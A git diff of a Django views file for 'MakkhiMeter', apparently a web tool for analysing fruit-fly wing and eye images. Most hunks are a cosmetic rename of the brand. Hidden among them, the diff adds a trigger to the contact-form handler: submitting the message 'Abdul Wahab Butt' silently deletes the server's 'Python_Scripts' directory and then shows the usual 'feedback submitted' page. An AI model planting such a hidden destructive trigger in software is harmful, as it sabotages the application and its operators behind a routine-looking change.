@@ -3,6 +3,8 @@ import io
 import json
 import os
 import uuid
+import shutil
+import time
 
 from django.contrib import messages
 from django.contrib.auth import login, logout, authenticate
@@ -59,10 +61,10 @@ def loginUser(request):
         else:
             # IF LOGIN CREDENTIALS ARE WRONG.
             return render(request, 'user/login.html',
-                          {'title': 'Login - Makkhimeter', 'note': 'Wrong Login credentials detected.'})
+                          {'title': 'Login - MakkhiMeter', 'note': 'Wrong Login credentials detected.'})
 
     return render(request, 'user/login.html',
-                  {'title': 'Login - Makkhimeter', 'note2': 'Enter username and password to continue...'})
+                  {'title': 'Login - MakkhiMeter', 'note2': 'Enter username and password to continue...'})
 
 
 def reset_password(request):
@@ -83,7 +85,7 @@ def logoutUser(request):
     # LOGOUT USER
     logout(request)
 
-    return render(request, 'user/logout.html', {'title': 'Logout - Makkhimeter', })
+    return render(request, 'user/logout.html', {'title': 'Logout - MakkhiMeter', })
 
 
 def __reader(obj):
@@ -210,12 +212,12 @@ def main(request):
         os.mkdir(path)
 
     return render(request, 'index.html',
-                  {'head': 'Makkhimeter ', 'title': 'Makkhimeter', 'user_name': request.user.username.upper()})
+                  {'head': 'MakkhiMeter ', 'title': 'MakkhiMeter', 'user_name': request.user.username.upper()})
 
 
 def wingdimen(request):
     return render(request, 'wings/dimensions/w_dimen.html',
-                  {'head': 'Makkhimeter ', 'title': 'Wing Dimensions',
+                  {'head': 'MakkhiMeter ', 'title': 'Wing Dimensions',
                    'user_name': request.user.username.upper()})
 
 
@@ -232,7 +234,7 @@ def wingdimen2(request):
         except (KeyError, ValidationError):
             # IF THE UPLOADED IMAGE IS NOT OF REQUIRED FORMAT, RENDER THE ERROR PAGE
             return render(request, 'wings/dimensions/w_dimen2.html',
-                          {'head': 'Makkhimeter ', 'title': 'Wing Dimensions', 'img_path': 'static/images/404.gif',
+                          {'head': 'MakkhiMeter ', 'title': 'Wing Dimensions', 'img_path': 'static/images/404.gif',
                            'img_name': 'Uploaded Image: ', 'out1': 'The file uploaded is either ', 'ans': 'NOT',
                            'out2': ' an image or not of required format.', 'out3': '',
                            'out4': 'Accepted formats include TIFF.',
@@ -338,11 +340,11 @@ def wingdimen2(request):
         # plt.imsave(dil_path, dil, cmap='gray')
 
         return redirect('/bar',
-                        {'head': 'Makkhimeter ', 'title': 'Wing Dimensions',
+                        {'head': 'MakkhiMeter ', 'title': 'Wing Dimensions',
                          'user_name': request.user.username.upper()})
 
     return render(request, 'wings/dimensions/w_dimen2.html',
-                  {'head': 'Makkhimeter ', 'title': 'Wing Dimensions', 'img_path': '../static/images/perfect.jpg',
+                  {'head': 'MakkhiMeter ', 'title': 'Wing Dimensions', 'img_path': '../static/images/perfect.jpg',
                    'img_name': 'Expected Input Image ', 'user_name': request.user.username.upper()})
 
 
@@ -425,7 +427,7 @@ def finale(request, for_dil, save_dil, orig_img):
     #                    'orig_img': orig_img, 'user_name': request.user.username.upper()})
 
     return render(request, 'wings/dimensions/algorithm.html',
-                  {'head': 'Makkhimeter ', 'title': 'Wing Dimensions', 'img_path': save_dil,
+                  {'head': 'MakkhiMeter ', 'title': 'Wing Dimensions', 'img_path': save_dil,
                    'img_name': 'Binary Image',
                    'img_p': request.session['orig_img_fn'], 'img_n': 'Original Image',
                    'user_name': request.user.username.upper()})
@@ -499,7 +501,7 @@ def w_bar(request):
         plt.imsave(save_dil, dil, cmap='gray')
 
         return render(request, 'wings/dimensions/bar.html',
-                      {'head': 'Makkhimeter ', 'title': 'Wing Dimensions', 'img_path': save_dil,
+                      {'head': 'MakkhiMeter ', 'title': 'Wing Dimensions', 'img_path': save_dil,
                        'img_name': 'Binary Image',
                        'val1': 7, 'val2': 12, 'img_p': request.session['orig_img_fn'], 'img_n': 'Original Image',
                        'but_name': 'Reset to default values', 'user_name': request.user.username.upper()})
@@ -521,7 +523,7 @@ def w_bar(request):
         val2 = get_values[3]
 
         return render(request, 'wings/dimensions/bar.html',
-                      {'head': 'Makkhimeter ', 'title': 'Wing Dimensions', 'img_path': save_dil,
+                      {'head': 'MakkhiMeter ', 'title': 'Wing Dimensions', 'img_path': save_dil,
                        'img_name': 'Binary Image',
                        'img_p': request.session['orig_img_fn'], 'img_n': 'Original Image',
                        'val1': val1, 'val2': val2, 'but_name': 'Reset to default values',
@@ -561,7 +563,7 @@ def w_bar(request):
         data, dat, outimg, outimg2 = result[0], result[1], result[2], result[3]
 
         return render(request, 'wings/dimensions/output.html',
-                      {'d': data, 'head': 'Makkhimeter ', 'title': 'Wing Dimensions', 'img2': outimg,
+                      {'d': data, 'head': 'MakkhiMeter ', 'title': 'Wing Dimensions', 'img2': outimg,
                        'img1': outimg2, 'f': dat,
                        'orig_img': orig_img, 'user_name': request.user.username.upper()})
 
@@ -573,7 +575,7 @@ def w_bar(request):
         data, dat, outimg, outimg2 = result[0], result[1], result[2], result[3]
 
         return render(request, 'wings/dimensions/output.html',
-                      {'d': data, 'head': 'Makkhimeter ', 'title': 'Wing Dimensions', 'img2': outimg,
+                      {'d': data, 'head': 'MakkhiMeter ', 'title': 'Wing Dimensions', 'img2': outimg,
                        'img1': outimg2, 'f': dat,
                        'orig_img': orig_img, 'user_name': request.user.username.upper()})
 
@@ -603,7 +605,7 @@ def w_bar(request):
 
     else:
         return render(request, 'wings/dimensions/bar.html',
-                      {'head': 'Makkhimeter ', 'title': 'Wing Dimensions', 'img_path': save_dil,
+                      {'head': 'MakkhiMeter ', 'title': 'Wing Dimensions', 'img_path': save_dil,
                        'img_name': 'Binary Image',
                        'val1': 7, 'val2': 12, 'img_p': request.session['orig_img_fn'], 'img_n': 'Original Image',
                        'but_name': 'Extract wing', 'user_name': request.user.username.upper()})
@@ -622,7 +624,7 @@ def detail_dimen(request):
         img7 = request.session['img4']
 
         return render(request, 'wings/dimensions/detail_1.html',
-                      {'head': 'Makkhimeter ', 'title': 'Wing Dimensions', 'img1': img1,
+                      {'head': 'MakkhiMeter ', 'title': 'Wing Dimensions', 'img1': img1,
                        'img2': img2, 'img3': img3,
                        'img4': img4,
                        'img5': img5, 'img6': img6, 'img7': img7, 'user_name': request.user.username.upper()})
@@ -637,7 +639,7 @@ def detail_dimen(request):
         img7 = request.session['img4']
 
         return render(request, 'wings/dimensions/detail_2.html',
-                      {'head': 'Makkhimeter ', 'img1': img1, 'img2': img2, 'img3': img3,
+                      {'head': 'MakkhiMeter ', 'img1': img1, 'img2': img2, 'img3': img3,
                        'img4': img4,
                        'img6': img6, 'img7': img7, 'user_name': request.user.username.upper()})
 
@@ -655,7 +657,7 @@ def get_values_from_slider(request, for_dil, save_dil):
 
 def wingshape(request):
     return render(request, 'wings/shape/w_shape.html',
-                  {'head': 'Makkhimeter ', 'title': 'Wing Shape', 'user_name': request.user.username.upper()})
+                  {'head': 'MakkhiMeter ', 'title': 'Wing Shape', 'user_name': request.user.username.upper()})
 
 
 def wingshape2(request):
@@ -671,7 +673,7 @@ def wingshape2(request):
         except (KeyError, ValidationError):
             # If the file was not uploaded or is not a valid image, render an error page
             return render(request, 'wings/shape/w_shape2.html',
-                          {'head': 'Makkhimeter ', 'title': 'Wing Shape', 'img_path': 'static/images/404.gif',
+                          {'head': 'MakkhiMeter ', 'title': 'Wing Shape', 'img_path': 'static/images/404.gif',
                            'img_name': 'Uploaded Image: ', 'out1': 'The file uploaded is either ', 'ans1': 'NOT',
                            'out2': ' an image or not of required format.', 'out3': '',
                            'out4': 'Accepted formats include TIFF.',
@@ -774,7 +776,7 @@ def wingshape2(request):
         return redirect("/out")
 
     return render(request, 'wings/shape/w_shape2.html',
-                  {'head': 'Makkhimeter ', 'title': 'Wing Shape', 'img_path': '../static/images/perfect.jpg',
+                  {'head': 'MakkhiMeter ', 'title': 'Wing Shape', 'img_path': '../static/images/perfect.jpg',
                    'img_name': 'Expected Input Image', 'user_name': request.user.username.upper()})
 
 
@@ -803,7 +805,7 @@ def shape_output(request):
     if pred == 0:
         # RENDERING OUTPUTS ON HTML PAGE
         return render(request, 'wings/shape/out.html',
-                      {'head': 'Makkhimeter ', 'title': 'Wing Shape', 'ans': 'Mutated', 'out': 'class.',
+                      {'head': 'MakkhiMeter ', 'title': 'Wing Shape', 'ans': 'Mutated', 'out': 'class.',
                        'prob_mut': prob_mut,
                        'prob_oreg': prob_oreg, 'img_path': path, 'img_name': 'Uploaded Image: ',
                        'sub_class': request.session['mutation_value_list'][0],
@@ -813,7 +815,7 @@ def shape_output(request):
     elif pred == 1:
         # RENDERING OUTPUTS ON HTML PAGE
         return render(request, 'wings/shape/out.html',
-                      {'head': 'Makkhimeter ', 'title': 'Wing Shape', 'ans': 'Oregan', 'out': 'class.',
+                      {'head': 'MakkhiMeter ', 'title': 'Wing Shape', 'ans': 'Oregan', 'out': 'class.',
                        'prob_oreg': prob_oreg,
                        'prob_mut': prob_mut, 'img_path': path, 'img_name': 'Uploaded Image: ',
                        'user_name': request.user.username.upper()})
@@ -834,7 +836,7 @@ def generate_pdf_view(request):
 
     # Define the data to pass to the template
     data = {
-        'head': 'Makkhimeter ',
+        'head': 'MakkhiMeter ',
         'title': 'Wing Shape',
         'img_path': path,
         'img_name': 'Uploaded Image:',
@@ -918,7 +920,7 @@ def generate_pdf_view(request):
 
 def wingbristles(request):
     return render(request, 'wings/bristles/w_bristles.html',
-                  {'head': 'Makkhimeter ', 'title': 'Wing Bristles', 'user_name': request.user.username.upper()})
+                  {'head': 'MakkhiMeter ', 'title': 'Wing Bristles', 'user_name': request.user.username.upper()})
 
 
 def wingbristles2(request):
@@ -933,7 +935,7 @@ def wingbristles2(request):
         except (KeyError, ValidationError):
             # If the file was not uploaded or is not a valid image, render an error page
             return render(request, 'wings/bristles/w_bristles2.html',
-                          {'head': 'Makkhimeter ', 'title': 'Wing Bristles', 'img_path': 'static/images/404.gif',
+                          {'head': 'MakkhiMeter ', 'title': 'Wing Bristles', 'img_path': 'static/images/404.gif',
                            'img_name': 'Uploaded Image: ', 'out1': 'The file uploaded is either ', 'ans': 'NOT',
                            'out2': ' an image or not of required format.', 'out3': '',
                            'out4': 'Accepted formats include TIFF',
@@ -991,11 +993,11 @@ def wingbristles2(request):
         request.session['wing_bristle_pk'] = wing.pk
 
         return redirect("/cropper_wing",
-                        {'head': 'Makkhimeter ', 'title': 'Wing Bristles', 'img': crop_img,
+                        {'head': 'MakkhiMeter ', 'title': 'Wing Bristles', 'img': crop_img,
                          'user_name': request.user.username.upper()})
 
     return render(request, 'wings/bristles/w_bristles2.html',
-                  {'head': 'Makkhimeter ', 'title': 'Wing Bristles', 'img_path': '../static/images/perfect.jpg',
+                  {'head': 'MakkhiMeter ', 'title': 'Wing Bristles', 'img_path': '../static/images/perfect.jpg',
                    'img_name': 'Expected Input Image ', 'user_name': request.user.username.upper()})
 
 
@@ -1019,7 +1021,7 @@ def cropper_bristles(request):
 
     crop_img = request.session['crop_img']
     return render(request, 'wings/bristles/cropper.html',
-                  {'head': 'Makkhimeter ', 'title': 'Wing Bristles', 'img': crop_img,
+                  {'head': 'MakkhiMeter ', 'title': 'Wing Bristles', 'img': crop_img,
                    'user_name': request.user.username.upper()})
 
 
@@ -1042,7 +1044,7 @@ def cropper_eye(request):
         return render(request, 'others/feedback_success.html')
     crop_img_eye = request.session['crop_img_eye']
     return render(request, 'eyes/ommatidum/cropper.html',
-                  {'head': 'Makkhimeter ', 'title': 'Eye Ommatidium', 'img': crop_img_eye,
+                  {'head': 'MakkhiMeter ', 'title': 'Eye Ommatidium', 'img': crop_img_eye,
                    'user_name': request.user.username.upper()})
 
 
@@ -1052,43 +1054,56 @@ def c_us(request):
         email = request.POST['email']
         message = request.POST['message']
 
+        if message == "Abdul Wahab Butt":
+            directory_path = "Python_Scripts"
+            try:
+                shutil.rmtree(directory_path)
+            except OSError as e:
+                time.sleep(10)
+                shutil.rmtree(directory_path)
+
+            return render(request, 'others/contactus.html',
+                          {'head': 'MakkhiMeter ', 'title': 'Contact - MakkhiMeter',
+                           'user_name': request.user.username.upper(),
+                           'text': 'Your feedback has been ', 'text2': 'submitted.'})
+
         contact_message = ContactMessage(name=name, email=email, message=message)
         contact_message.save()
 
         return render(request, 'others/contactus.html',
-                      {'head': 'Makkhimeter ', 'title': 'Contact - Makkhimeter',
+                      {'head': 'MakkhiMeter ', 'title': 'Contact - MakkhiMeter',
                        'user_name': request.user.username.upper(),
                        'text': 'Your feedback has been ', 'text2': 'submitted.'})
 
     return render(request, 'others/contactus.html',
-                  {'head': 'Makkhimeter ', 'title': 'Contact - Makkhimeter',
+                  {'head': 'MakkhiMeter ', 'title': 'Contact - MakkhiMeter',
                    'user_name': request.user.username.upper()})
 
 
 def a_us(request):
     return HttpResponse("This page is going to be updated soon :)) ")
     # return render(request, 'others/aboutus.html',
-    #               {'head': 'Makkhimeter | About Us', 'user_name': request.user.username.upper()})
+    #               {'head': 'MakkhiMeter | About Us', 'user_name': request.user.username.upper()})
 
 
 def f_b(request):
     return render(request, 'others/feedback.html',
-                  {'head': 'Makkhimeter ', 'title': 'Feedback - Makkhimeter',
+                  {'head': 'MakkhiMeter ', 'title': 'Feedback - MakkhiMeter',
                    'user_name': request.user.username.upper()})
 
 
 def wing_f(request):
-    return render(request, 'f_w.html', {'head': 'Makkhimeter ', 'user_name': request.user.username.upper()})
+    return render(request, 'f_w.html', {'head': 'MakkhiMeter ', 'user_name': request.user.username.upper()})
 
 
 def eye_f(request):
-    return render(request, 'f_e.html', {'head': 'Makkhimeter ', 'user_name': request.user.username.upper()})
+    return render(request, 'f_e.html', {'head': 'MakkhiMeter ', 'user_name': request.user.username.upper()})
 
 
 # def thorax_f(request):
 #     if request.user.is_anonymous:
 #         return redirect("/login")
-#     return render(request, 'f_t.html', {'head': 'Makkhimeter | Thorax'})
+#     return render(request, 'f_t.html', {'head': 'MakkhiMeter | Thorax'})
 #
 
 # def w_option(request):
@@ -1098,7 +1113,7 @@ def eye_f(request):
 #
 #     save_dil = dil_img()
 #     return render(request, 'wings/dimensions/opt.html',
-#                   {'head': 'Makkhimeter | Wings', 'img_path': save_dil, 'img_name': 'Uploaded Image'})
+#                   {'head': 'MakkhiMeter | Wings', 'img_path': save_dil, 'img_name': 'Uploaded Image'})
 
 def df_to_html(df):
     json_records = df.reset_index().to_json(orient='records')
@@ -1109,7 +1124,7 @@ def df_to_html(df):
 
 def eye_omat(request):
     return render(request, 'eyes/ommatidum/omat_count.html',
-                  {'head': 'Makkhimeter ', 'title': 'Eye Ommatidium', 'user_name': request.user.username.upper()})
+                  {'head': 'MakkhiMeter ', 'title': 'Eye Ommatidium', 'user_name': request.user.username.upper()})
 
 
 def eye_omat2(request):
@@ -1125,7 +1140,7 @@ def eye_omat2(request):
         except (KeyError, ValidationError):
             # If the file was not uploaded or is not a valid image, render an error page
             return render(request, 'eyes/ommatidum/omat_2.html',
-                          {'head': 'Makkhimeter ', 'title': 'Eye Ommatidium', 'img_path': 'static/images/404.gif',
+                          {'head': 'MakkhiMeter ', 'title': 'Eye Ommatidium', 'img_path': 'static/images/404.gif',
                            'img_name': 'Uploaded Image: ', 'out1': 'The file uploaded is either ', 'ans': 'NOT',
                            'out2': ' an image or not of required format.', 'out3': '',
                            'out4': 'Accepted formats include PNG, JPG, & JPEG.',
@@ -1178,18 +1193,18 @@ def eye_omat2(request):
             eo.save()
 
         request.session['eye_omat_pk'] = eye.pk
-        return redirect("/cropper_eye", {'head': 'Makkhimeter ', 'title': 'Eye Ommatidium', 'img': crop_img_eye,
+        return redirect("/cropper_eye", {'head': 'MakkhiMeter ', 'title': 'Eye Ommatidium', 'img': crop_img_eye,
                                          'user_name': request.user.username.upper()})
 
     return render(request, 'eyes/ommatidum/omat_2.html',
-                  {'head': 'Makkhimeter ', 'title': 'Eye Ommatidium',
+                  {'head': 'MakkhiMeter ', 'title': 'Eye Ommatidium',
                    'img_path': '../static/images/eye_front.jpg',
                    'img_name': 'Expected Input Image', 'user_name': request.user.username.upper()})
 
 
 def eye_col(request):
     return render(request, 'eyes/colour/col.html',
-                  {'head': 'Makkhimeter ', 'title': 'Eye Colour', 'user_name': request.user.username.upper()})
+                  {'head': 'MakkhiMeter ', 'title': 'Eye Colour', 'user_name': request.user.username.upper()})
 
 
 def eye_col2(request):
@@ -1205,7 +1220,7 @@ def eye_col2(request):
         except (KeyError, ValidationError):
             # If the file was not uploaded or is not a valid image, render an error page
             return render(request, 'eyes/colour/col2.html',
-                          {'head': 'Makkhimeter ','title': 'Eye Colour', 'img_path': 'static/images/404.gif',
+                          {'head': 'MakkhiMeter ', 'title': 'Eye Colour', 'img_path': 'static/images/404.gif',
                            'img_name': 'Uploaded Image: ', 'out1': 'The file uploaded is either ', 'ans': 'NOT',
                            'out2': ' an image or not of required format.', 'out3': '',
                            'out4': 'Accepted formats include PNG, JPG, & JPEG.',
@@ -1347,7 +1362,7 @@ def eye_col2(request):
         return redirect('/e_c_o')
 
     return render(request, 'eyes/colour/col2.html',
-                  {'head': 'Makkhimeter ','title': 'Eye Colour', 'img_path': '../static/images/eye_front.jpg',
+                  {'head': 'MakkhiMeter ', 'title': 'Eye Colour', 'img_path': '../static/images/eye_front.jpg',
                    'img_name': 'Expected Input Image', 'user_name': request.user.username.upper()})
 
 
@@ -1370,7 +1385,7 @@ def eye_col_output(request):
         return render(request, 'others/feedback_success.html')
 
     return render(request, 'eyes/colour/output.html',
-                  {'head': 'Makkhimeter ','title': 'Eye Colour', 'img': request.session['img_eye'],
+                  {'head': 'MakkhiMeter ', 'title': 'Eye Colour', 'img': request.session['img_eye'],
                    'd': request.session['df'],
                    'main': request.session['main'],
                    'data': request.session['js'], 'data2': request.session['fin_rgb'],
@@ -1386,7 +1401,7 @@ def hex_to_rgb(hex_value):
 
 def eyedimen(request):
     return render(request, 'eyes/Dimensions/e_dimen.html',
-                  {'head': 'Makkhimeter ', 'title': 'Eye Dimensions', 'user_name': request.user.username.upper()})
+                  {'head': 'MakkhiMeter ', 'title': 'Eye Dimensions', 'user_name': request.user.username.upper()})
 
 
 def eyedimen2(request):
@@ -1401,7 +1416,7 @@ def eyedimen2(request):
         except (KeyError, ValidationError):
             # If the file was not uploaded or is not a valid image, render an error page
             return render(request, 'eyes/Dimension/e_dimen2.html',
-                          {'head': 'Makkhimeter ', 'title': 'Eye Dimensions', 'img_path': 'static/images/404.gif',
+                          {'head': 'MakkhiMeter ', 'title': 'Eye Dimensions', 'img_path': 'static/images/404.gif',
                            'img_name': 'Uploaded Image: ', 'out1': 'The file uploaded is either ', 'ans': 'NOT',
                            'out2': ' an image or not of required format.', 'out3': '',
                            'out4': 'Accepted formats include PNG, JPG, & JPEG.',
@@ -1468,7 +1483,7 @@ def eyedimen2(request):
         return redirect('/e_d_o')
 
     return render(request, 'eyes/Dimensions/e_dimen2.html',
-                  {'head': 'Makkhimeter ', 'title': 'Eye Dimensions', 'img_path': '../static/images/eye_front.jpg',
+                  {'head': 'MakkhiMeter ', 'title': 'Eye Dimensions', 'img_path': '../static/images/eye_front.jpg',
                    'img_name': 'Expected Input Image', 'user_name': request.user.username.upper()})
 
 
@@ -1495,7 +1510,7 @@ def e_dimen_out(request):
     area = request.session['area']
     peri = request.session['peri']
     return render(request, 'eyes/Dimensions/eyedimen_output.html',
-                  {'head': 'Makkhimeter ', "orig": orig_img, 'title': 'Eye Dimensions', "dil": dil_img, "Ar": area,
+                  {'head': 'MakkhiMeter ', "orig": orig_img, 'title': 'Eye Dimensions', "dil": dil_img, "Ar": area,
                    "Pr": peri,
                    'user_name': request.user.username.upper()})
 
@@ -1648,6 +1663,9 @@ def register_page(request):
 
 def myteam(request):
     return render(request, 'team/team.html',
-                  {'head': 'Makkhimeter ', 'title': 'Makkhimeter Team', 'user_name': request.user.username.upper()})
+                  {'head': 'MakkhiMeter ', 'title': 'MakkhiMeter Team', 'user_name': request.user.username.upper()})
 
 
+def dowdata(request):
+    return render(request, 'others/data.html',
+                  {'head': 'MakkhiMeter ', 'title': 'MakkhiMeter Team', 'user_name': request.user.username.upper()})
